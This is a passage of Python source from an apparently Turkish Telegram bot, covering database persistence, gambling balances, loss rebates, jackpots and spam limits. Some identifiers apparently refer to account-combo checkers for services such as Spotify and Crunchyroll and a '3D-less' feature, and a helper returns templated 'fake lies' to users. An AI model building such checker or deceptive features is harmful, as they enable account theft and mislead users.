    global group_claim_codes, user_activity_week, activity_week_start, daily_checkin_claims
    group_claim_codes = data.get("group_claim_codes") or {}
    user_activity_week = _safe_int_dict(data.get("user_activity_week", {}))
    activity_week_start = data.get("activity_week_start")
    daily_checkin_claims = _safe_int_dict(data.get("daily_checkin_claims", {}))

    global gamble_history, market_daily_buys, checker_favorites, checker_recent
    global custom_checkers, custom_checkers_pending, checker_subs
    gamble_history = _safe_int_dict(data.get("gamble_history", {}))
    market_daily_buys = _safe_int_dict(data.get("market_daily_buys", {}))
    checker_favorites = _safe_int_dict(data.get("checker_favorites", {}))
    checker_recent = _safe_int_dict(data.get("checker_recent", {}))
    custom_checkers = data.get("custom_checkers", {}) or {}
    custom_checkers_pending = data.get("custom_checkers_pending", {}) or {}
    checker_subs = {}
    _cs = data.get("checker_subs") or {}
    if isinstance(_cs, dict):
      for _k, _v in _cs.items():
        try:
          checker_subs[int(_k)] = _v if isinstance(_v, dict) else {}
        except Exception:
          try:
            checker_subs[_k] = _v if isinstance(_v, dict) else {}
          except Exception:
            pass
    global sub_remind_sent, sub_purchase_log, quest_card_claims
    sub_remind_sent = {}
    try:
      for _k, _v in (data.get("sub_remind_sent") or {}).items():
        try:
          sub_remind_sent[int(_k)] = str(_v)
        except Exception:
          sub_remind_sent[_k] = str(_v)
    except Exception:
      pass
    sub_purchase_log = list(data.get("sub_purchase_log") or [])[-500:]
    quest_card_claims = _safe_int_dict(data.get("quest_card_claims", {}))
    global premium_codes
    premium_codes = {}
    try:
      for _ck, _cv in (data.get("premium_codes") or {}).items():
        if isinstance(_cv, dict):
          premium_codes[str(_ck).upper()] = _cv
    except Exception:
      pass

    activity_logs = list(data.get("activity_logs", []) or [])[-500:]
    maintenance_message = data.get("maintenance_message", maintenance_message) or maintenance_message
    user_notifications = _safe_int_dict(data.get("user_notifications", {}))
    user_currency = _safe_int_dict(data.get("user_currency", {}))
    global scammer_reports, pending_scammer_reports, bug_reports, pending_bug_reports, bot_ratings
    scammer_reports = data.get("scammer_reports", {}) or {}
    pending_scammer_reports = data.get("pending_scammer_reports", {}) or {}
    bug_reports = data.get("bug_reports", {}) or {}
    pending_bug_reports = data.get("pending_bug_reports", {}) or {}
    bot_ratings = {}
    _br = data.get("bot_ratings") or {}
    if isinstance(_br, dict):
      for _k, _v in _br.items():
        try:
          if isinstance(_v, dict):
            bot_ratings[int(_k)] = {
              "stars": int(_v.get("stars") or 0),
              "time": str(_v.get("time") or ""),
              "comment": str(_v.get("comment") or "")[:300],
            }
          else:
            bot_ratings[int(_k)] = {"stars": int(_v), "time": "", "comment": ""}
        except Exception:
          try:
            bot_ratings[_k] = _v if isinstance(_v, dict) else {}
          except Exception:
            pass

    global channel_bonus_claimed, login_streaks, user_achievements, active_polls, slot_play_counts
    channel_bonus_claimed = _safe_set_int(data.get("channel_bonus_claimed", []))
    login_streaks = _safe_int_dict(data.get("login_streaks", {}))
    user_achievements = _safe_int_dict(data.get("user_achievements", {}))
    active_polls = data.get("active_polls", {}) or {}
    for pid, p in list(active_polls.items()):
      try:
        for opt in p.get("options", []):
          if isinstance(opt.get("votes"), list):
            opt["votes"] = set(opt["votes"])
          elif not isinstance(opt.get("votes"), set):
            opt["votes"] = set()
      except Exception:
        pass
    slot_play_counts = _safe_int_dict(data.get("slot_play_counts", {}), lambda v: int(v or 0))
    global checker_usage, user_discounts
    checker_usage = _safe_int_dict(data.get("checker_usage", {}), lambda v: int(v or 0))
    user_discounts = _safe_int_dict(data.get("user_discounts", {}))
    global earn_tasks, user_earn_claims, log_search_used
    global gamble_loss_streak, gamble_next_win_after
    earn_tasks = data.get("earn_tasks", {}) or {}
    user_earn_claims = _safe_int_dict(data.get("user_earn_claims", {}))
    global pending_earn_claims
    pending_earn_claims = data.get("pending_earn_claims", {}) or {}
    log_search_used = _safe_int_dict(data.get("log_search_used", {}), lambda v: int(v or 0))
    global log_search_last
    log_search_last = _safe_int_dict(data.get("log_search_last", {}), lambda v: float(v or 0))
    global user_bot_tokens
    _ubt = data.get("user_bot_tokens") or {}
    user_bot_tokens = {}
    if isinstance(_ubt, dict):
      for _k, _v in _ubt.items():
        try:
          user_bot_tokens[int(_k)] = _v if isinstance(_v, dict) else {}
        except Exception:
          pass
    gamble_loss_streak = _safe_int_dict(data.get("gamble_loss_streak", {}), lambda v: int(v or 0))
    gamble_next_win_after = _safe_int_dict(data.get("gamble_next_win_after", {}), lambda v: int(v or 0))

    global confessions, confession_meta, daily_question, giveaways, wheel_last
    global blackhole_pot, blackhole_players, shadow_banned, stock_prices, stock_portfolio
    confessions = data.get("confessions") or []
    if not isinstance(confessions, list):
      confessions = []
    confession_meta = {}
    _cm = data.get("confession_meta") or {}
    if isinstance(_cm, dict):
      for k, v in _cm.items():
        try:
          confession_meta[str(k)] = int(v)
        except Exception:
          pass
    daily_question = data.get("daily_question") or {"q": "", "opts": [], "votes": {}, "active": False}
    if not isinstance(daily_question, dict):
      daily_question = {"q": "", "opts": [], "votes": {}, "active": False}
    _votes = {}
    for uk, ov in (daily_question.get("votes") or {}).items():
      try:
        _votes[int(uk)] = int(ov)
      except Exception:
        pass
    daily_question["votes"] = _votes
    giveaways = data.get("giveaways") or {}
    if not isinstance(giveaways, dict):
      giveaways = {}
    wheel_last = _safe_int_dict(data.get("wheel_last") or {}, lambda v: str(v))
    blackhole_pot = float(data.get("blackhole_pot") or 0)
    blackhole_players = list(_safe_set_int(data.get("blackhole_players") or []))
    shadow_banned = _safe_set_int(data.get("shadow_banned") or [])
    stock_prices = data.get("stock_prices") or {}

    global daily_cekilis, user_night_badges
    _dc = data.get("daily_cekilis")
    if isinstance(_dc, dict):
      daily_cekilis = {
        "active": bool(_dc.get("active")),
        "prize": float(_dc.get("prize") or 0),
        "entrants": [],
        "started_at": float(_dc.get("started_at") or 0),
        "day": str(_dc.get("day") or ""),
        "channel_msg_id": _dc.get("channel_msg_id"),
        "last_remind": float(_dc.get("last_remind") or 0),
        "winner": _dc.get("winner"),
        "give_sub": bool(_dc.get("give_sub", True)),
      }
      for _e in (_dc.get("entrants") or []):
        try:
          daily_cekilis["entrants"].append(int(_e))
        except Exception:
          pass
      try:
        if daily_cekilis["winner"] is not None:
          daily_cekilis["winner"] = int(daily_cekilis["winner"])
      except Exception:
        pass
    user_night_badges = _safe_set_int(data.get("user_night_badges") or [])

    global admin_ban_strikes, member_warns
    admin_ban_strikes = {}
    for k, v in (data.get("admin_ban_strikes") or {}).items():
      try:
        admin_ban_strikes[int(k)] = int(v)
      except Exception:
        pass
    member_warns = {}
    for k, v in (data.get("member_warns") or {}).items():
      try:
        member_warns[str(k)] = int(v)
      except Exception:
        pass
    global chat_msg_counts, chat_msg_day, last_top_award_day
    chat_msg_counts = {}
    for k, v in (data.get("chat_msg_counts") or {}).items():
      try:
        chat_msg_counts[int(k)] = int(v)
      except Exception:
        pass
    chat_msg_day = str(data.get("chat_msg_day") or "")
    last_top_award_day = str(data.get("last_top_award_day") or "")

    stock_portfolio = {}
    for uk, pf in (data.get("stock_portfolio") or {}).items():
      try:
        clean = {}
        if isinstance(pf, dict):
          for sk, sv in pf.items():
            try:
              clean[str(sk)] = float(sv)
            except Exception:
              pass
        stock_portfolio[int(uk)] = clean
      except Exception:
        pass

    global gamble_cycle_lost
    gamble_cycle_lost = _safe_int_dict(data.get("gamble_cycle_lost", {}), lambda v: float(v or 0))
    global gamble_convert_uses
    gamble_convert_uses = _safe_int_dict(data.get("gamble_convert_uses", {}))
    global user_quiet_mode, season_data, suspicion_scores
    user_quiet_mode = _safe_int_dict(data.get("user_quiet_mode", {}), lambda v: bool(v))
    _sd = data.get("season_data")
    if isinstance(_sd, dict):
      season_data = _sd
      _prog = {}
      for uk, pv in (season_data.get("progress") or {}).items():
        try:
          _prog[int(uk)] = pv if isinstance(pv, dict) else {}
        except Exception:
          pass
      season_data["progress"] = _prog
      _cl = {}
      for uk, pv in (season_data.get("claimed") or {}).items():
        try:
          _cl[int(uk)] = bool(pv)
        except Exception:
          pass
      season_data["claimed"] = _cl
    suspicion_scores = {}
    for uk, pv in (data.get("suspicion_scores") or {}).items():
      try:
        suspicion_scores[int(uk)] = pv if isinstance(pv, dict) else {}
      except Exception:
        pass

    loaded_market = data.get("market_data", None)
    if loaded_market:
      market_data = loaded_market
    loaded_vip = data.get("vip_market_data", None)
    if loaded_vip:
      vip_market_data = loaded_vip

    _DB_LOAD_OK = True
    src = used_path if used_path == DB_FILE else f"YEDEK → {used_path}"
    print(f"✅ database yüklendi: {src} | kullanıcı={len(registered_users)} bakiye={len(user_balances)} ban={len(banned_users)}")
    if used_path != DB_FILE:
      try:
        save_data()
        print("💾 Yedek ana database.json olarak geri yazıldı.")
      except Exception as re:
        print(f"⚠️ Yedek geri yazılamadı: {re}")
  except Exception as e:
    _DB_LOAD_OK = False
    print(f"⚠️ Veri parse hatası (KAYIT ENGELLENDİ): {e}")
    try:
      log_error("load_data_parse", e)
    except Exception:
      pass

def save_data():
  global _DB_LOAD_OK
  if not _DB_LOAD_OK:
    try:
      disk_ok = os.path.exists(DB_FILE) and os.path.getsize(DB_FILE) > 50
    except Exception:
      disk_ok = False
    if disk_ok and (len(registered_users) > 0 or len(user_balances) > 0):
      _DB_LOAD_OK = True
      print("⚠️ load_ok yeniden True (bellekte veri var).")
    elif disk_ok:
      print("🛑 save_data engellendi: DB load OK değil, mevcut database.json korunuyor.")
      return
    else:
      _DB_LOAD_OK = True
      print("⚠️ load_ok True yapıldı (disk DB yok/boş).")
  try:
    if os.path.exists(DB_FILE) and os.path.getsize(DB_FILE) > 200:
      with open(DB_FILE, "r", encoding="utf-8") as rf:
        disk = json.load(rf)
      disk_users = len(disk.get("registered_users") or [])
      disk_bal = len(disk.get("user_balances") or {})
      mem_users = len(registered_users)
      mem_bal = len(user_balances)
      if disk_users >= 3 and mem_users == 0:
        print(f"🛑 save_data engellendi: diskte {disk_users} kullanıcı, bellekte 0 — veri silinmesin.")
        return
      if disk_bal >= 3 and mem_bal == 0 and sum(float(v or 0) for v in (disk.get("user_balances") or {}).values()) > 1:
        print(f"🛑 save_data engellendi: diskte bakiyeler var, bellekte yok.")
        return
  except Exception as e:
    pass
  data = {
    "registered_users": list(registered_users),
    "user_credentials": user_credentials,
    "banned_users": list(banned_users),
    "hard_banned_users": list(hard_banned_users),
    "pending_hard_bans": pending_hard_bans,
    "support_warns": support_warns,
    "temp_banned_users": temp_banned_users,
    "unban_requests_sent": list(unban_requests_sent),
    "admin_ids": list(admin_ids_set),
    "user_balances": user_balances,
    "user_gamble_balances": user_gamble_balances,
    "last_gamble_bonus": last_gamble_bonus,
    "user_fingerprints": user_fingerprints,
    "referral_week_stats": referral_week_stats,
    "referral_week_start": referral_week_start,
    "ref_balances": ref_balances,
    "user_referrers": user_referrers,
    "pending_orders": pending_orders,
    "pending_vip_orders": pending_vip_orders,
    "pending_listing_orders": pending_listing_orders,
    "withdrawal_requests": withdrawal_requests,
    "pending_star_payments": pending_star_payments,
    "smm_orders": smm_orders,
    "listings": listings,
    "coupons": coupons,
    "active_tickets": active_tickets,
    "gambling_profits": gambling_profits,
    "custom_member_categories": custom_member_categories,
    "user_languages": user_languages,
    "market_data": market_data,
    "vip_market_data": vip_market_data,
    "daily_bonus_claims": daily_bonus_claims,
    "jackpot_pool": jackpot_pool,
    "tournament_week_start": tournament_week_start,
    "maintenance_mode": maintenance_mode,
    "maintenance_until": maintenance_until,
    "feature_3dsiz_enabled": feature_3dsiz_enabled,
    "feature_telz_enabled": feature_telz_enabled,
    "balance_history": balance_history,
    "pending_listing_approvals": pending_listing_approvals,
    "seller_ratings": seller_ratings,
    "min_withdraw": min_withdraw,
    "withdraw_commission": withdraw_commission,
    "daily_quests": daily_quests,
    "user_xp": user_xp,
    "user_level": user_level,
    "wheel_claims": wheel_claims,
    "daily_box_claims": daily_box_claims,
    "group_claim_codes": group_claim_codes,
    "user_activity_week": user_activity_week,
    "activity_week_start": activity_week_start,
    "daily_checkin_claims": {str(k): v for k, v in (daily_checkin_claims or {}).items()},
    "gamble_history": {str(k): v for k, v in (gamble_history or {}).items()},
    "market_daily_buys": {str(k): v for k, v in (market_daily_buys or {}).items()},
    "checker_subs": {str(k): v for k, v in (checker_subs or {}).items()},
    "sub_remind_sent": {str(k): v for k, v in (sub_remind_sent or {}).items()},
    "sub_purchase_log": list(sub_purchase_log or [])[-500:],
    "quest_card_claims": {str(k): v for k, v in (quest_card_claims or {}).items()},
    "premium_codes": {str(k): v for k, v in (premium_codes or {}).items()},
    "checker_favorites": {str(k): v for k, v in (checker_favorites or {}).items()},
    "checker_recent": {str(k): v for k, v in (checker_recent or {}).items()},
    "custom_checkers": custom_checkers,
    "custom_checkers_pending": custom_checkers_pending,

    "activity_logs": activity_logs[-500:],
    "maintenance_message": maintenance_message,
    "user_notifications": user_notifications,
    "user_currency": user_currency,
    "scammer_reports": scammer_reports,
    "pending_scammer_reports": pending_scammer_reports,
    "bug_reports": bug_reports,
    "pending_bug_reports": pending_bug_reports,
    "bot_ratings": {str(k): v for k, v in (bot_ratings or {}).items()},
    "channel_bonus_claimed": list(channel_bonus_claimed),
    "login_streaks": login_streaks,
    "user_achievements": user_achievements,
    "active_polls": {
      pid: {
        **{k: v for k, v in p.items() if k != "options"},
        "options": [
          {"text": o["text"], "votes": list(o.get("votes", set()))}
          for o in p.get("options", [])
        ]
      }
      for pid, p in active_polls.items()
    },
    "slot_play_counts": slot_play_counts,
    "checker_usage": checker_usage,
    "user_discounts": user_discounts,
    "earn_tasks": earn_tasks,
    "user_earn_claims": user_earn_claims,
    "pending_earn_claims": pending_earn_claims,
    "log_search_used": log_search_used,
    "log_search_last": {str(k): v for k, v in (log_search_last or {}).items()},
    "user_bot_tokens": {str(k): v for k, v in (user_bot_tokens or {}).items()},
    "confessions": (confessions or [])[-500:],
    "confession_meta": {str(k): v for k, v in (confession_meta or {}).items()},
    "daily_question": daily_question,
    "giveaways": giveaways,
    "wheel_last": {str(k): v for k, v in (wheel_last or {}).items()},
    "blackhole_pot": float(globals().get("blackhole_pot") or 0),
    "blackhole_players": list(blackhole_players or []),
    "shadow_banned": list(shadow_banned or []),
    "stock_prices": stock_prices,
    "daily_cekilis": {
      "active": bool((daily_cekilis or {}).get("active")),
      "prize": float((daily_cekilis or {}).get("prize") or 0),
      "entrants": list((daily_cekilis or {}).get("entrants") or []),
      "started_at": float((daily_cekilis or {}).get("started_at") or 0),
      "day": str((daily_cekilis or {}).get("day") or ""),
      "channel_msg_id": (daily_cekilis or {}).get("channel_msg_id"),
      "last_remind": float((daily_cekilis or {}).get("last_remind") or 0),
      "winner": (daily_cekilis or {}).get("winner"),
      "give_sub": bool((daily_cekilis or {}).get("give_sub", True)),
    },
    "user_night_badges": list(user_night_badges or []),
    "stock_portfolio": {str(k): v for k, v in (stock_portfolio or {}).items()},
    "admin_ban_strikes": {str(k): int(v) for k, v in (admin_ban_strikes or {}).items()},
    "member_warns": {str(k): int(v) for k, v in (member_warns or {}).items()},
    "chat_msg_counts": {str(k): int(v) for k, v in (chat_msg_counts or {}).items()},
    "chat_msg_day": chat_msg_day,
    "last_top_award_day": last_top_award_day,
    "gamble_loss_streak": gamble_loss_streak,
    "gamble_next_win_after": gamble_next_win_after,
    "gamble_cycle_lost": gamble_cycle_lost,
    "gamble_convert_uses": gamble_convert_uses,
    "user_quiet_mode": {str(k): bool(v) for k, v in (user_quiet_mode or {}).items()},
    "season_data": {
      **{k: v for k, v in (season_data or {}).items() if k not in ("progress", "claimed")},
      "progress": {str(k): v for k, v in ((season_data or {}).get("progress") or {}).items()},
      "claimed": {str(k): bool(v) for k, v in ((season_data or {}).get("claimed") or {}).items()},
    },
    "suspicion_scores": {str(k): v for k, v in (suspicion_scores or {}).items()},
  }
  try:
    try:
      if os.path.exists(DB_FILE) and os.path.getsize(DB_FILE) > 20:
        os.makedirs(DB_BACKUP_DIR, exist_ok=True)
        import shutil
        ts = time.strftime("%Y%m%d_%H%M%S")
        bak = os.path.join(DB_BACKUP_DIR, f"database_{ts}.json")
        shutil.copy2(DB_FILE, bak)
        baks = sorted(
          [os.path.join(DB_BACKUP_DIR, x) for x in os.listdir(DB_BACKUP_DIR) if x.startswith("database_") and x.endswith(".json")]
        )
        for oldb in baks[:-12]:
          try:
            os.remove(oldb)
          except Exception:
            pass
    except Exception as be:
      try:
        log_error("db_backup", be)
      except Exception:
        pass
    db_dir = os.path.dirname(os.path.abspath(DB_FILE)) or "."
    try:
      os.makedirs(db_dir, exist_ok=True)
    except Exception:
      pass
    tmp = DB_FILE + ".tmp"
    try:
      with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
        f.flush()
        try:
          os.fsync(f.fileno())
        except Exception:
          pass
      try:
        os.replace(tmp, DB_FILE)
      except OSError:
        import shutil
        try:
          if os.path.exists(DB_FILE):
            os.remove(DB_FILE)
        except Exception:
          pass
        shutil.move(tmp, DB_FILE)
      _DB_LOAD_OK = True
    except Exception as write_err:
      try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
          json.dump(data, f, ensure_ascii=False, indent=4)
          f.flush()
        _DB_LOAD_OK = True
        try:
          if os.path.exists(tmp):
            os.remove(tmp)
        except Exception:
          pass
      except Exception:
        raise write_err
  except Exception as e:
    print(f"⚠️ Veri kaydedilirken hata: {e}")
    try:
      log_error("save_data", e)
    except Exception:
      pass
    try:
      if os.path.exists(DB_FILE + ".tmp"):
        os.remove(DB_FILE + ".tmp")
    except Exception:
      pass

def get_gamble_convert_left(user_id):
  """12 saatlik pencerede kalan çevirim hakkı (max 3)."""
  now = time.time()
  data = gamble_convert_uses.get(user_id, {})
  start = float(data.get("window_start", 0) or 0)
  count = int(data.get("count", 0) or 0)
  if start <= 0 or (now - start) >= GAMBLE_CONVERT_WINDOW:
    return GAMBLE_CONVERT_MAX
  return max(0, GAMBLE_CONVERT_MAX - count)

def use_gamble_convert(user_id):
  """Çevirim hakkını 1 düşür. Başarılıysa True."""
  now = time.time()
  data = gamble_convert_uses.get(user_id, {})
  start = float(data.get("window_start", 0) or 0)
  count = int(data.get("count", 0) or 0)
  if start <= 0 or (now - start) >= GAMBLE_CONVERT_WINDOW:
    gamble_convert_uses[user_id] = {"window_start": now, "count": 1}
    return True
  if count >= GAMBLE_CONVERT_MAX:
    return False
  data["count"] = count + 1
  gamble_convert_uses[user_id] = data
  return True

def contains_blasphemy(text):
  """Allah'a / dine ağır küfür var mı?"""
  if not text:
    return False
  low = text.lower().replace("ı", "i").replace("ş", "s").replace("ğ", "g").replace("ü", "u").replace("ö", "o").replace("ç", "c")
  raw = text.lower()
  for kw in BLASPHEMY_KEYWORDS:
    k2 = kw.lower().replace("ı", "i").replace("ş", "s").replace("ğ", "g").replace("ü", "u").replace("ö", "o").replace("ç", "c")
    if kw in raw or k2 in low:
      return True
  return False

def report_blasphemy_to_channel(user_id, username, text):
  """Küfür mesajını kanala ilet."""
  uname = f"@{username}" if username else str(user_id)
  msg = (
    f"🚨 **NAMUSSUZ / KÜFÜR TESPİTİ**\n"
    f"📌 Kaynak: Anonim Sohbet\n"
    f"👤 Kullanıcı: `{user_id}` ({uname})\n"
    f"🕐 {get_current_time_str()}\n\n"
    f"💬 Mesaj:\n{text[:1500]}"
  )
  targets = []
  if CHANNEL_ID:
    targets.append(CHANNEL_ID)
  if CHAT_ID:
    targets.append(CHAT_ID)
  for admin_id in admin_ids_set:
    targets.append(admin_id)
  sent = set()
  for t in targets:
    if t in sent:
      continue
    sent.add(t)
    try:
      bot.send_message(t, msg, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(t, msg.replace("**", "").replace("`", ""))
      except Exception:
        pass

def get_norm_bal(user_id):
  """Normal TL bakiye — int/str key uyumu."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  v = user_balances.get(uid)
  if v is None:
    v = user_balances.get(str(uid))
  if v is None:
    v = user_balances.get(user_id)
  try:
    return float(v or 0)
  except Exception:
    return 0.0

def set_norm_bal(user_id, amount):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  user_balances[uid] = float(amount)
  try:
    user_balances.pop(str(uid), None)
  except Exception:
    pass

def add_norm_bal(user_id, delta):
  set_norm_bal(user_id, get_norm_bal(user_id) + float(delta))

def get_gamble_bal(user_id):
  return float(user_gamble_balances.get(user_id, 0.0))

def set_gamble_bal(user_id, amount):
  v = float(amount)
  if v < 0:
    v = 0.0
  try:
    cap = float(MAX_GAMBLE_BALANCE)
    if v > cap:
      v = cap
  except Exception:
    pass
  user_gamble_balances[user_id] = v

def add_gamble_bal(user_id, amount):
  """Kumar bakiyesi güncelle. Negatif = kayıp biriktir. 0'a düşünce %40 kayıp iadesi. Tavan: MAX_GAMBLE_BALANCE."""
  amount = float(amount)
  before = get_gamble_bal(user_id)
  after = before + amount
  if after < 0:
    after = 0.0
  try:
    cap = float(MAX_GAMBLE_BALANCE)
    if after > cap:
      after = cap
  except Exception:
    pass
  user_gamble_balances[user_id] = after
  if amount < 0:
    lost_now = min(before, -amount)
    if lost_now > 0:
      gamble_cycle_lost[user_id] = float(gamble_cycle_lost.get(user_id, 0.0)) + lost_now
  if after <= 0.0001:
    try_loss_rebate(user_id)
  return user_gamble_balances[user_id]

def try_loss_rebate(user_id):
  """
  Kumar bakiyesi 0 iken: bu döngüde kaybedilen >= 50 TL ise %40 otomatik iade.
  Örn: 3000 kaybetti → 1200 TL kumar bakiyesi geri.
  """
  lost = float(gamble_cycle_lost.get(user_id, 0.0) or 0.0)
  if lost < LOSS_REBATE_MIN:
    return 0.0
  if get_gamble_bal(user_id) > 0.01:
    return 0.0
  rebate = round(lost * LOSS_REBATE_RATE, 2)
  if rebate <= 0:
    return 0.0
  gamble_cycle_lost[user_id] = 0.0
  user_gamble_balances[user_id] = float(user_gamble_balances.get(user_id, 0.0)) + rebate
  try:
    save_data()
  except Exception:
    pass
  try:
    bot.send_message(
      user_id,
      f"💔 **Kayıp Bonusu**\n\n"
      f"Bu turda kaybettiğin: **{lost:.0f} TL**\n"
      f"İade (%{int(LOSS_REBATE_RATE*100)}): **+{rebate:.0f} TL** kumar bakiyesi\n"
      f"🎲 Kumar bakiyen: **{get_gamble_bal(user_id):.2f} TL**\n\n"
      f"Bakiye 0 olunca otomatik işler (min kayıp {LOSS_REBATE_MIN:.0f} TL).",
      parse_mode="Markdown"
    )
  except Exception:
    pass
  log_activity("loss_rebate", user_id, f"lost={lost:.0f} rebate={rebate:.0f}")
  return rebate

def claim_gamble_bonus_if_due(user_id):
  """2 saatte bir +1000 kumar bakiyesi. Offline max 1 periyot."""
  now = time.time()
  last = float(last_gamble_bonus.get(user_id, 0) or 0)
  if last <= 0:
    last_gamble_bonus[user_id] = now
    add_gamble_bal(user_id, GAMBLE_BONUS_AMOUNT)
    return GAMBLE_BONUS_AMOUNT
  elapsed = now - last
  if elapsed >= GAMBLE_BONUS_INTERVAL:
    last_gamble_bonus[user_id] = now
    add_gamble_bal(user_id, GAMBLE_BONUS_AMOUNT)
    return GAMBLE_BONUS_AMOUNT
  return 0.0

def gamble_bonus_remaining(user_id):
  last = float(last_gamble_bonus.get(user_id, 0) or 0)
  if last <= 0:
    return 0
  left = GAMBLE_BONUS_INTERVAL - (time.time() - last)
  return max(0, int(left))

def get_level_discount(user_id):
  """Level bazlı market indirimi: L5 %5, L10 %10, L15 %15, L20+ %20"""
  lvl = int(user_level.get(user_id, 1) or 1)
  if lvl >= 20: return 0.20
  if lvl >= 15: return 0.15
  if lvl >= 10: return 0.10
  if lvl >= 5: return 0.05
  return 0.0

def update_gambling_profit(user_id, profit):
  global gambling_profits
  gambling_profits[user_id] = gambling_profits.get(user_id, 0.0) + profit
  try:
    add_gamble_history(user_id, "oyun", abs(float(profit)), "kazanç" if profit >= 0 else "kayıp", float(profit))
  except Exception:
    pass
  save_data()

def is_user_banned(user_id):
  if user_id in hard_banned_users and user_id not in admin_ids_set:
    return True
  if user_id in admin_ids_set:
    if user_id in banned_users:
      banned_users.discard(user_id)
      save_data()
    if user_id in temp_banned_users:
      temp_banned_users.pop(user_id, None)
      save_data()
    return False

  if user_id in banned_users:
    return True
  if user_id in temp_banned_users:
    if time.time() < temp_banned_users[user_id]:
      return True
    else:
      del temp_banned_users[user_id]
      save_data()
  return False

def apply_hard_ban(user_id, reason="support_spam"):
  """Admin unban ile açılamayan kalıcı ban."""
  if user_id in admin_ids_set:
    return False
  hard_banned_users.add(int(user_id))
  banned_users.add(int(user_id))
  temp_banned_users.pop(int(user_id), None)
  user_states.pop(int(user_id), None)
  try:
    user_states.pop(user_id, None)
  except Exception:
    pass
  save_data()
  log_activity("hard_ban", user_id, reason)
  return True

def is_support_spam_message(text):
  """Sadece tamamen boş / anlamsız destek mesajı (çok agresif olmasın)."""
  if not text:
    return True
  t = text.strip()
  if len(t) < SUPPORT_MIN_LEN:
    return True
  if not any(ch.isalnum() for ch in t):
    return True
  core = t.replace(" ", "")
  if len(core) >= 2 and len(set(core)) <= 1:
    return True
  return False

def _is_gaming_context(user_id, chat_id=None, callback_data=None):
  """Kumar / şans oyunları — spam ban uygulanmaz."""
  try:
    st = user_states.get(chat_id) if chat_id is not None else None
    if st is None and user_id is not None:
      st = user_states.get(user_id)
    if st:
      st_l = str(st).lower()
      if st_l in (
        "waiting_tkm_bet", "waiting_yazitura_bet", "waiting_zeplin_bet",
        "waiting_mines_bet", "waiting_bonanza_bet", "waiting_dede_bet",
        "waiting_dice_bet", "waiting_duel_bet", "waiting_market_qty",
        "waiting_crypto_amount", "active_live_chat", "ai_chat", "ai_chat_nsfw",
        "waiting_custom_chk_py", "waiting_cchk_combo", "waiting_cchk_menu_name", "waiting_cchk_rename", "waiting_admin_py_file", "waiting_admin_py_name",
      ):
        return True
      if st_l.startswith("waiting_") and any(x in st_l for x in (
        "bet", "slot", "mine", "zeplin", "gamble", "kumar", "dice", "tkm",
        "yazitura", "bonanza", "dede", "cpm", "n11", "combo", "checker",
        "proxy", "spotify", "telz", "crunchyroll", "checker_speed",
      )):
        return True
    if user_id in active_mines_games or user_id in active_zeplin_games:
      return True
    if chat_id in active_auto_slots or user_id in active_auto_slots:
      return True
    cd = (callback_data or "")
    if cd:
      prefixes = (
        "mine_", "cash_out", "tkm_", "yt_choice_", "dice_", "slot",
        "menu_gambling", "gamble_", "zeplin_", "auto_slot", "pvp_",
        "duel_", "quiz_", "wheel_", "blackhole", "crypto_", "buy_market_",
        "menu_market", "star_buy_", "star_gamble_",
      )
      if any(cd.startswith(p) or p in cd for p in prefixes):
        return True
  except Exception:
    pass
  return False

def check_spam(user_id, chat_id, username, callback_data=None):
  if user_id in admin_ids_set:
    return False
  if _is_gaming_context(user_id, chat_id, callback_data):
    return False
  now = time.time()
  if user_id not in user_request_times:
    user_request_times[user_id] = []
  user_request_times[user_id].append(now)
  user_request_times[user_id] = [t for t in user_request_times[user_id] if now - t < MSG_SPAM_TIME]
  if len(user_request_times[user_id]) > MSG_SPAM_LIMIT:
    if not is_user_banned(user_id):
      ban_secs = int(TEMP_BAN_DURATION) if TEMP_BAN_DURATION else 600
      temp_banned_users[user_id] = now + ban_secs
      save_data()
      mins = max(1, ban_secs // 60)
      try:
        bot.send_message(chat_id, f"🛑 **Çok hızlı istek!** Kısa engel: **{mins} dk**.\n(Kumar/oyun muaf)", parse_mode="Markdown")
      except Exception:
        pass
    return True
  return False

def check_callback_spam(user_id, chat_id, username, callback_data=None):
  if user_id in admin_ids_set:
    return False
  if _is_gaming_context(user_id, chat_id, callback_data):
    return False
  now = time.time()
  if user_id not in callback_request_times:
    callback_request_times[user_id] = []
  callback_request_times[user_id].append(now)
  callback_request_times[user_id] = [t for t in callback_request_times[user_id] if now - t < CB_SPAM_TIME]
  if len(callback_request_times[user_id]) > CB_SPAM_LIMIT:
    if not is_user_banned(user_id):
      ban_secs = int(TEMP_BAN_DURATION) if TEMP_BAN_DURATION else 600
      temp_banned_users[user_id] = now + ban_secs
      save_data()
      mins = max(1, ban_secs // 60)
      try:
        bot.send_message(chat_id, f"🛑 **Buton spam.** Kısa engel: **{mins} dk**.\n(Kumar butonları muaf)", parse_mode="Markdown")
      except Exception:
        pass
    return True
  return False

def add_to_jackpot(bet_amount):
  global jackpot_pool
  contribution = bet_amount * JACKPOT_PERCENT
  jackpot_pool += contribution
  save_data()
  return contribution

def is_night_mode():
  """00:00 – 06:00 arası gece modu."""
  try:
    h = datetime.now().hour
    return NIGHT_START_HOUR <= h < NIGHT_END_HOUR
  except Exception:
    return False

def effective_jackpot_chance():
  base = float(JACKPOT_CHANCE or 0.02)
  if is_night_mode():
    return min(0.35, base * float(NIGHT_JACKPOT_MULT))
  return base

def mark_night_owl(user_id):
  if not is_night_mode():
    return False
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if uid in user_night_badges:
    return False
  user_night_badges.add(uid)
  try:
    save_data()
  except Exception:
    pass
  return True

def get_fake_lie(user_id=None):
  n = random.randint(3, 97)
  tpl = random.choice(FAKE_LIES)
  try:
    return tpl.format(n=n)
  except Exception:
    return tpl

def try_jackpot(user_id, chat_id):
  global jackpot_pool
  if jackpot_pool < 10:
    return False
  chance = effective_jackpot_chance()
  if random.random() < chance:
    win = jackpot_pool
    jackpot_pool = 0.0
    user_balances[user_id] = user_balances.get(user_id, 0.0) + win
    save_data()
    night_tag = " 🌙" if is_night_mode() else ""
    try:
      bot.send_message(chat_id, f"🎰💰 **JACKPOT PATLADI!**{night_tag}\n\n🎉 **+{win:.2f} TL** kazandınız!\n💳 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", parse_mode="Markdown")
    except:
      pass
    for uid in registered_users:
      if uid != user_id:
        try:
